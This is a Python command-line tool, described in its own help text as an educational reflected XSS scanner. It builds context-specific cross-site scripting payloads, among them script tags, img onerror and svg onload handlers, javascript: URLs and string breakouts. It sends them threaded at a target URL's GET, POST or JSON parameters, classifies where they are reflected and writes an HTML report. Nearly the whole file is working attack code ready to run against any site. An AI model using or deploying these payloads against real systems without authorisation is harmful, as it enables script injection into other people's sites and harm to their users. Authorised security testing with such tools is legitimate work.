import argparse, html, json, re, requests, uuid
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

init(autoreset = True)

DEFAULT_TIMEOUT = 10
MAX_WORKERS = 15




class PayloadGenerator :
    
    def __init__(self, marker_prefix = "XSS") :
        self.marker_prefix  =  marker_prefix

    def _mk_marker(self) :
        return f"{self.marker_prefix}-{uuid.uuid4().hex[ :8]}"


    def generate(self, context) :
        marker = self._mk_marker()

        if context == "tag_name" :
            return [
                marker,
                f"</{marker}>",
                f"<{marker}",
                f"{marker}x",
                f"{marker}{uuid.uuid4().hex[:4]}",
            ]
        elif context == "attr_name" :
            return [
                marker,
                f"{marker}=1",
                f"on{marker}=alert(1)",
                f"{marker}x",
                f"{marker}-evt",
            ]

        elif context == "attr_value":
            return [
                f"\"{marker}\"",
                f"'{marker}'",
                f"{marker}\">",
                f"{marker}\" onmouseover=alert(1)",
                f"{marker}' autofocus onfocus=alert(1) x='",
                f"{marker}\" onerror=alert(1)",
            ]

        elif context == "text":
            return [
                marker,
                f"<script>alert('{marker}')</script>",
                f"<img src=x onerror=alert('{marker}')>",
                f"<svg xmlns='http://www.w3.org/2000/svg' onload=alert('{marker}')>",
                f"<iframe srcdoc='<script>alert(`{marker}`)</script>'></iframe>",
                f"<a href='javascript:alert(\"{marker}\")'>click</a>",
                f"<object data='javascript:alert(\"{marker}\")'></object>",
                f"<video src onerror=alert('{marker}')></video>",
                f"<audio src onerror=alert('{marker}')></audio>",
                f"<math href='javascript:alert({marker})'></math>",
                f"<textarea>{marker}</textarea>",
                f"<base href='javascript:alert({marker})'>",
                f"<meta http-equiv='refresh' content='0;url=javascript:alert({marker})'>",
                f"<form action='javascript:alert({marker})'><input type=submit></form>",
            ]

        elif context == "js":
            return [
                f"';alert('{marker}');//",
                f"\";alert(\"{marker}\");//",
                f"{marker};",
                f"');document.location=`javascript:alert(\"{marker}\")`;//",
            ]

        elif context == "json":
            return [
                f"{marker}",
                f"\"{marker}\": \"{marker}\"",
                f"\\u003Cscript\\u003Ealert('{marker}')\\u003C/script\\u003E",
                f"<img src=x onerror=alert('{marker}')>",
            ]

        return [marker]




def detect_context_heuristic(response_text, marker) :
    
    pos = response_text.find(marker)
    if pos == -1 :
        return None

    
    for script in re.finditer(r"<script.*?>", response_text, flags = re.IGNORECASE | re.DOTALL) :
        sstart = script.end()
        
        close = response_text.find("</script>", sstart)
        if close !=  -1 and sstart <=  pos <=  close :
            return "js"

    
    left = response_text.rfind("<", 0, pos)
    right = response_text.find(">", pos)
    if left !=  -1 and (right == -1 or left > response_text.rfind(">", 0, pos)) :
        
        between = response_text[left : right if right !=  -1 else pos+len(marker)]
        
        eq_pos = between.find("=")
        
        marker_rel = between.find(marker)
        if marker_rel !=  -1 and marker_rel < (eq_pos if eq_pos !=  -1 else len(between)) :
            
            if between.startswith("<"+marker) or re.match(r"<\s*"+re.escape(marker), between) :
                return "tag_name"
            else :
                return "attr_name"
        else :
            if eq_pos !=  -1 and marker_rel > eq_pos :
                return "attr_value"
    return "text"





class XSSScanner :
    
    def __init__(self, target_url, params, method = "GET", headers = None, cookies = None,
                 timeout = DEFAULT_TIMEOUT, json_body = False, workers = 8) :
        self.url = target_url
        self.params = params or []
        self.method = method.upper()
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.json_body = json_body
        self.generator = PayloadGenerator()
        self.results = []
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.cookies.update(self.cookies)
        self.workers = workers if workers > 0 else 1


    def _request(self, param, payload, use_json = False) :
        
        try :
            if self.method == "GET" :
                qs = {}
                
                for p in self.params :
                    qs[p] = payload if p == param else ""
                resp = self.session.get(self.url, params = qs, timeout = self.timeout)
            elif self.method == "POST" :
                if self.json_body or use_json :
                    j = {}
                    for p in self.params :
                        j[p] = payload if p == param else ""
                    resp = self.session.post(self.url, json = j, timeout = self.timeout)
                else :
                    d = {}
                    for p in self.params :
                        d[p] = payload if p == param else ""
                    resp = self.session.post(self.url, data = d, timeout = self.timeout)
            else :
                return None, f"Unsupported HTTP method : {self.method}"
            return resp, None
        except Exception as e :
            return None, str(e)



    def _scan_one(self, param, context) :
        
        findings = []
        payloads = self.generator.generate(context)
        for p in payloads :
            marker = re.search(r'([A-Za-z0-9_\-]{6,})', p)
            
            resp, err = self._request(param, p, use_json = (context == "json"))
            if err or resp is None :
                continue
            text = resp.text or ""
            if p in text or (marker and marker.group(0) in text) :
                
                detected = detect_context_heuristic(text, marker.group(0) if marker else p)
                findings.append({
                    "param" : param,
                    "context_tested" : context,
                    "detected_context" : detected,
                    "payload" : p,
                    "status_code" : resp.status_code,
                    "url_requested" : resp.url,
                })
        return findings



    def run(self, contexts = None, parallel = True) :
        """
        Run the scan across all params and contexts. Returns results list.
        contexts : list of contexts to test. If None, use default set (including attribute-name).
        """
        if contexts is None :
            contexts = ["tag_name", "attr_name", "attr_value", "text", "js", "json"]

        tasks = []
        if parallel :
            with ThreadPoolExecutor(max_workers = min(self.workers, MAX_WORKERS)) as ex :
                futures = []
                for param in self.params :
                    for ctx in contexts :
                        futures.append(ex.submit(self._scan_one, param, ctx))
                for fut in as_completed(futures) :
                    try :
                        findings = fut.result()
                        self.results.extend(findings)
                    except Exception as e :
                        print("Task failed :", e)
        else :
            for param in self.params :
                for ctx in contexts :
                    findings = self._scan_one(param, ctx)
                    self.results.extend(findings)
        return self.results



    def print_report(self) :
        if not self.results :
            print(Fore.RED + "[*] No reflections found." + Style.RESET_ALL)
            return
        print(Fore.BLUE + f"\n[*] Reflections found : {len(self.results)}\n" + Style.RESET_ALL)
        for r in self.results :
            print(
                Fore.LIGHTGREEN_EX
                + f"- Param : {r['param']} | tested : {r['context_tested']} | detected : {r['detected_context']} | status : {r['status_code']}"
                + Style.RESET_ALL
            )
            print(Fore.BLUE + f"  Payload : " + Fore.RED + f"{r['payload']}" + Style.RESET_ALL)
            print(Fore.BLUE + f"  URL : " + Fore.YELLOW + f"{r['url_requested']}" + Style.RESET_ALL)
            print()


    
    def html_report(self, out_file = "xss_report.html") :
        now = datetime.now(timezone.utc).isoformat()
        rows = []
        for r in self.results :
            safe_payload = html.escape(r['payload'])
            rows.append(
                f"<tr><td>{html.escape(r['param'])}</td>"
                f"<td>{html.escape(r['context_tested'])}</td>"
                f"<td>{html.escape(str(r['detected_context']))}</td>"
                f"<td><pre>{safe_payload}</pre></td>"
                f"<td>{r['status_code']}</td>"
                f"<td>{html.escape(r['url_requested'])}</td></tr>"
            )
        html_text = f"""<!doctype html>
<html>
<head><meta charset = "utf-8"><title>XSS Scanner Report</title>
<style>
body{{font-family :system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;margin :20px}}
table{{border-collapse :collapse;width :100%}}
td,th{{border :1px solid #ccc;padding :8px;vertical-align :top}}
pre{{white-space :pre-wrap;word-break :break-all;margin :0}}
h1{{font-size :1.4rem}}
</style>
</head>
<body>
<h1>XSS Scanner Report</h1>
<p>Target : {html.escape(self.url)} — generated : {now}</p>
<table>
<thead><tr><th>Param</th><th>Tested Context</th><th>Detected Context</th><th>Payload</th><th>HTTP</th><th>URL</th></tr></thead>
<tbody>
{''.join(rows)}
</tbody>
</table>
</body>
</html>"""
        
        with open(out_file, "w", encoding = "utf-8") as fh :
            fh.write(html_text)
        return out_file



def parse_kv_list(kv_str) :
    
    if not kv_str :
        return {}
    out = {}
    parts = re.split(r'\s*,\s*', kv_str.strip())
    for p in parts :
        if " :" in p :
            k, v = p.split(" :", 1)
            out[k.strip()] = v.strip()
    return out




def print_banner():
    banner1 = r"""
 __  __  ____   ____   
 \ \/ / /____| /____| 
  \  /  \___ \ \___ \ 
  /  \  ____) | ___) |
 /_/\_\ \____/ /____/"""

    banner2 = r"""
                   ____     ____      _      _   _   _   _   _____   ____
                  / ___|   / ___|    / \    | \ | | | \ | | | ____| |  _ \
                  \___ \  | |       / _ \   |  \| | |  \| | |  _|   | |_) |
                   ___) | | |___   / ___ \  | |\  | | |\  | | |___  |  _ <
                  |____/   \____| /_/   \_\ |_| \_| |_| \_| |_____| |_| \_\
    """
    
    print(Fore.LIGHTYELLOW_EX + banner1 + Fore.LIGHTCYAN_EX + banner2 + Style.RESET_ALL)




def main() :
    print_banner()
    ap = argparse.ArgumentParser(description = "Small reflected XSS scanner (educational).")
    ap.add_argument("--url", required = True, help = "Target base URL (include scheme http/https)")
    ap.add_argument("--params", nargs = "+", required = True, help = "List of parameter names to test")
    ap.add_argument("--method", default = "GET", choices = ["GET","POST"], help = "HTTP method")
    ap.add_argument("--json", dest = "json_body", action = "store_true", help = "Send POST body as JSON (if POST)")
    ap.add_argument("--headers", help = "Custom headers : 'Name :Value,Name2 :Value2'")
    ap.add_argument("--cookies", help = "Cookies : 'name :value,name2 :value2'")
    ap.add_argument("--workers", type = int, default = 8, help = "Parallel worker threads")
    ap.add_argument("--no-parallel", dest = "parallel", action = "store_false", help = "Disable parallel requests")
    ap.add_argument("--out", default = "xss_report.html", help = "HTML report output file")
    args = ap.parse_args()

    headers = parse_kv_list(args.headers)
    cookies = parse_kv_list(args.cookies)

    scanner = XSSScanner(
        target_url = args.url,
        params = args.params,
        method = args.method,
        headers = headers,
        cookies = cookies,
        json_body = args.json_body,
        workers = args.workers
    )
    print(Fore.MAGENTA + "[*] Starting scan. This tool performs many requests — ensure you have permission." + Style.RESET_ALL)
    results = scanner.run(parallel = args.parallel)
    scanner.print_report()
    out = scanner.html_report(out_file = args.out)
    print(Fore.LIGHTBLUE_EX + f"[*] HTML report written to : {out}")



if __name__ == "__main__" :
    main()
